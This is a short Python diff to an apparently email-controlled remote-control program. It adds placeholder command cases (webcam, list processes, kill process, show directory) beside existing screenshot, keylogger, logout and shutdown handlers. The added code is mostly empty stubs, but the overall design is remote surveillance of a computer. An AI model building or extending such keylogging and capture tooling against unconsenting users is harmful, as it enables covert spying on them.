@@ -106,16 +106,31 @@ class Mail:
             )
             self.email_message.attach(text_attachment)
 
+    def log(self):
+        note2log(self.sender, self.cmd_list)
+
     def process_command(self):
         match self.cmd_list[0]:
             case "screenshot":
                 self.take_screenshot()
+            case "webcam":
+                pass
             case "keylog":
                 self.keylogger()
             case "logout":
                 self.log_out()
             case "shutdown":
                 self.shut_down()
+            case "list apps":
+                pass
+            case "list processes":
+                pass
+            case "kill process":
+                pass
+            case "show dir":
+                pass
+            case "show log":
+                pass
             case _:
                 pass
 
